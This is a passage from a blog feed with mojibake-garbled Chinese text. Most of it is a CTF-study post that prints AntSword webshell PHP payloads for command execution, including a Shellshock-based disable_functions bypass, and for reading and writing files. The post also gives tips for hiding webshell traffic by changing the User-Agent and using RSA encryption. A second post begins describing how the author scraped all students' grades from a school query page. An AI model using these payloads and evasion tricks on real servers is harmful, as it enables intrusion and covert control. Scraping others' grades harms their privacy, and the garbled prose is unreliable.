<span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">            @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;</span><br><span class="line">            @system(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;</span><br><span class="line">            @passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;</span><br><span class="line">            @exec(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">&quot;&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">            @proc_close(<span class="variable">$p</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;</span><br><span class="line">            @antsystem(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">            <span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">            <span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">            <span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">dd32c0973cea1a=Y2QgIi92YXIvd3d3L2h0bWwiO2xzO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==</span><br><span class="line"><span class="comment"># cd &quot;/var/www/html&quot;;ls;echo [S];pwd;echo [E]</span></span><br><span class="line">mbd5f87b32df2b=L2Jpbi9zaA== </span><br><span class="line"><span class="comment"># /bin/sh</span></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚å°±æ˜¯åˆ©ç”¨bashè¿è¡Œï¼Œç„¶åè¿”å›ç»“æœï¼Œå®åœ¨æ˜¯å¤ªé•¿äº†ã€‚ã€‚ã€‚</p><h3 id="æ–‡ä»¶ç®¡ç†"><a href="#æ–‡ä»¶ç®¡ç†" class="headerlink" title="æ–‡ä»¶ç®¡ç†"></a>æ–‡ä»¶ç®¡ç†</h3><h4 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cmd=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$output</span>=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;79dfaa6a&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;6befcf28f0f8&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$F</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;xcb1bd75c217ce&quot;</span>]);</span><br><span class="line">        <span class="variable">$P</span>=@fopen(<span class="variable">$F</span>,<span class="string">&quot;r&quot;</span>);<span class="comment">#æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">echo</span>(@fread(<span class="variable">$P</span>,filesize(<span class="variable">$F</span>)?filesize(<span class="variable">$F</span>):<span class="number">4096</span>));<span class="comment">#è¯»æ–‡ä»¶ï¼Œä¸æ¸…æ¥šå¤§å°å°±è¯»4MBï¼Œè¾“å‡ºåˆ°ç¼“å­˜åŒº</span></span><br><span class="line">        @fclose(<span class="variable">$P</span>);;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;;</span><br><span class="line">    asoutput();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">xcb1bd75c217ce=L3Zhci93d3cvaHRtbC9pbmRleC5waHA=</span><br><span class="line"><span class="comment">#/var/www/html/index.php</span></span><br></pre></td></tr></table></figure><h4 id="æ–°å»ºæ–‡ä»¶"><a href="#æ–°å»ºæ–‡ä»¶" class="headerlink" title="æ–°å»ºæ–‡ä»¶"></a>æ–°å»ºæ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cmd=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$output</span>=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;4e2d44f&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;e9188218b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> @fwrite(fopen(base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;xcb1bd75c217ce&quot;</span>]),<span class="string">&quot;w&quot;</span>),base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;rc3235e6b73a85&quot;</span>]))?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>;</span><br><span class="line">    <span class="comment"># å¤§æ¦‚æ˜¯æ‰“å¼€æ–‡ä»¶ï¼Œå†™å…¥Halo AntSword!</span></span><br><span class="line">;&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">rc3235e6b73a85=I0hhbG8gQW50U3dvcmQh </span><br><span class="line"><span class="comment">#Halo AntSword!</span></span><br><span class="line">xcb1bd75c217ce=L3Zhci93d3cvaHRtbC90ZXN0LnR4dA==</span><br><span class="line"><span class="comment">#/var/www/html/test.txt</span></span><br></pre></td></tr></table></figure><h4 id="å†™å…¥æ–‡ä»¶"><a href="#å†™å…¥æ–‡ä»¶" class="headerlink" title="å†™å…¥æ–‡ä»¶"></a>å†™å…¥æ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$output</span>=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;f9e3e350bf&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;3721032877&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> @fwrite(fopen(base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;oa037d12e7ff1b&quot;</span>]),<span class="string">&quot;w&quot;</span>),base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;oa5bfdf2210f2e&quot;</span>]))?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>;</span><br><span class="line">;</span><br><span class="line">    <span class="comment">#å°±æ˜¯å°†æ•°æ®å†™åˆ°æ–‡ä»¶</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">oa037d12e7ff1b=L3Zhci93d3cvaHRtbC90ZXN0LnR4dA==</span><br><span class="line"><span class="comment">#/var/www/html/test.txt</span></span><br><span class="line">oa5bfdf2210f2e=dGVzdA==</span><br><span class="line"><span class="comment">#test</span></span><br></pre></td></tr></table></figure><h2 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h2><h3 id="æ›´æ”¹UAå¤´"><a href="#æ›´æ”¹UAå¤´" class="headerlink" title="æ›´æ”¹UAå¤´"></a>æ›´æ”¹UAå¤´</h3><p>E:\ctf\CTFTOOLS\web\antSword\antSword-2.1.8.1\modules\request.js<br>ä¸­æ”¹</p><pre><code>// è¯·æ±‚UAconst USER_AGENT = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#39;;</code></pre><h3 id="RSAåŠ å¯†æµé‡"><a href="#RSAåŠ å¯†æµé‡" class="headerlink" title="RSAåŠ å¯†æµé‡"></a>RSAåŠ å¯†æµé‡</h3><p>åˆ©ç”¨è‡ªå¸¦çš„RSAç¼–ç å™¨ï¼Œç”Ÿæˆå…¬é’¥ç§é’¥ï¼Œå°†ç”Ÿæˆçš„phpä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œèšå‰‘å°†ç¼–ç å™¨æ”¹ä¸ºrsaåé‡æ–°è¿æ¥<br><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210925233158.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant&#x3D;la3KN%2BFosCL%2BwV8SoqFXbjysNZv3Pipg13BSNrtfHRoaXkGJAhLoO2OXtO%2Bu47K87url5Sl6fH%2FtQmjw2sb%2B9kRhIrFxK5bZkOW9BBGtCvNh54n6rCVLeRXDWxkrYhtGuXHZANxxLpJ0%2BKTeThGLCKosfWHbTRn1dJlHy95qLoY%3D%7CxfdFU25cqoWX6%2FkpRLK%2FdOGrWws1NSnArRYMhW3MSRVil2nDp6pkcDLGSwkM1D1hL09kzqZQagSYN37sH%2FMymehinfsD5gGIZJUANmf17X%2BjbS0zObtl68%2FVCmUpvL5stF7mXU6LgdTY2VFvhb2rmuAHm2PcR6ulWBvZxgJoc8U%3D%7Cos9zBh%2FkldShM88wE7jD20L%2BorzmNz%2B%2BFpb8sZbCQWhwtAyrdCux9NIKegA%2FGf6UfZDXWF974NHNo%2BeKrUsid4lw%2BcoEu0ISLD%2FezteTHeBHAwZjPblBwHb7dU6C7Rt8%2F6DwX3MbJxXwcVb1mplukykpCGSG%2BV9X2ipWrac2NcM%3D%7Cx5tBL8n39xfH2LDI3tiug%2F0xbrA9sualN32DxTWc1DS3daqd0Zk%2BOptNFLYblMK89gzDmDYodgY0rs%2FCoQ6s9SD4R%2BXVo8hmI%2FsiGTbKc64HtrVld0xRmkYKanZZuBYu7fUYXWEt35%2FlI5916YZlV3Kk81jXrXCxoRhzUzQ%2B0c8%3D%7CfHn6ZNFKKeKI7GyN7fiod75nffVYYJZ4GEVsdYnMOAEw6Ds45RbIm64Xz5KGZb%2B8K%2FUUSbm%2B0GaSAEWKMzvdGicdAh%2BW7QpG8YnvKEJ1QbyB7xF6Ncba4TGX5iL3e0lNF8rZLUXlkw7NLSi3KN5HZecXlUQ0gD1OqoQ%2BR3VzIYg%3D%7Cjw7awkFmEOao3qxJNOLAO5PyBdyCympc7KDUIs7rrKnJzRhqSUHVffZdyoSglh37qBzr0g3MM3W33wxwq4BnMUtaIJHsnLrashxQjdKxLPB1RuOYjKorLYI5NcWxl6WunTrMf2c%2FMcV%2F5OU8dtQoSkEmRlh9W%2F8ljK2KHc2q3c4%3D%7Ctx6yz2bhEQ8v7E6blADNV2KGVhSXaU484aHodI1Es15yFHlaFRAs6NPCDfArzD%2Byj%2FZtvs%2F%2FItIbZG7mvlQnrQmSqeK5JrLoKcDVSxsuJnS5fZteBt9z1cZv%2BNm5JfPwTIIVZk7OZhXULD6%2Fy3UZIDNAYqzftQAfLzsLjSvWR0U%3D%7CKvLYMP7S3qkOwjv8JX6Es1EJIj8IUgkzwvfQza8j88sYPLM8IZ1fuDM6efkIYW%2BYzI1Pdkv05asoIcVo4wnvFxIxK286gqNgx8c6BWJ96yhrglrHP9YwUzcEhBSrb3Anjc4gsm3cwKhgEpYwcFzpex2DYp5AsRK2p4w%2FvzyGPoI%3D%7CosyGM9%2BgL45wtui9oYPhJHb2to%2BowQnyL5Lbu5t2vODSk3O6wa1yLLjmBNTQQpeJvmm%2BBYzKGi3AHptab0DXbkmEtbh2aBWF2L5RJb%2Bqem487zbaylCb%2BN2ckSED47zmPgZ8Tr00jkR%2Fr82oEEV1ToJ6T7zO%2BMzPe3hAG0jbPE4%3D</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ•°æ®å·²ç»è¢«åŠ å¯†äº†</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.freebuf.com/articles/web/264896.html">https://www.freebuf.com/articles/web/264896.html</a><br><a href="https://zhuanlan.zhihu.com/p/369496846">https://zhuanlan.zhihu.com/p/369496846</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‡†å¤‡&quot;&gt;&lt;a href=&quot;#å‡†å¤‡&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡&quot;&gt;&lt;/a&gt;å‡†å¤‡&lt;/h2&gt;&lt;p&gt;é¶æœºä¸ºä¸€å°è¿è¡Œkaliçš„è™šæ‹Ÿæœºï¼Œæå‰å†™äº†ä¸€å¥è¯&lt;/p&gt;</summary>
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€æ¬¡çˆ¬è™«å®æˆ˜</title>
    <link href="http://haorical.xyz/posts/5a85636c/"/>
    <id>http://haorical.xyz/posts/5a85636c/</id>
    <published>2021-09-23T15:04:58.000Z</published>
    <updated>2021-09-23T15:23:52.309Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘è¿·ä¸Šäº†pythonï¼Œå„ç§èŠ±é‡Œèƒ¡å“¨çš„åº“ä¹Ÿå¤ªå¥½ç©äº†ã€‚</p><p>ä»Šå¤©å¯¼å‘˜å‘äº†ä¸ªæŸ¥æˆç»©çš„é€šçŸ¥ï¼Œå¤–åŠ äº†é“¾æ¥ï¼Œä¸€ä¸ªå¾ˆç®€å•çš„ç½‘é¡µï¼Œè¾“å…¥å­¦å·å§“åå°±èƒ½æŸ¥ï¼Œé—²æ¥æ— äº‹å°±æŠŠæ‰€æœ‰äººçš„å…¨çˆ¬ä¸‹æ¥äº†ï¼Œå¤–åŠ åšäº†ä¸€æ³¢åˆ†æï¼ˆç‹—å¤´ï¼‰</p><h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>å¾ˆç®€å•çš„ä¸€ä¸ªç½‘é¡µ</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210923231120.png"></p><p>å…ˆæŠ“åŒ…åˆ†æï¼Œå‘ç°postçš„æœ‰ç”¨çš„å°±çœŸçš„åªæœ‰ä¸ªå­¦å·å§“åï¼Œè¿ä¸ªå‰ç«¯åŠ å¯†éƒ½æ²¡æœ‰ï¼Œç›´æ¥æ„é€ å°±è¡Œã€‚</p><p>ç°å­¦äº†execelæ–‡ä»¶è¯»å†™ï¼Œç”¨èœçš„æ‰£è„šçš„beautifulsoupæŠŠç½‘é¡µä¿¡æ¯æå–å‡ºæ¥äº†ï¼Œå¾ˆç®€å•ã€‚</p><p>è€Œä¸”ç½‘ç«™è¿ä¸ªåçˆ¬éƒ½æ²¡æœ‰ï¼Œç›´æ¥è¯·æ±‚äº†å¥½å‡ ç™¾æ¬¡éƒ½æ²¡é™åˆ¶ï¼Œæ— è¯­ã€‚</p><p><strong>ä»£ç å¦‚ä¸‹ï¼Œå·²å»é™¤å…³é”®ä¿¡æ¯ï¼Œä»…ä¾›å­¦ä¹ ï¼</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 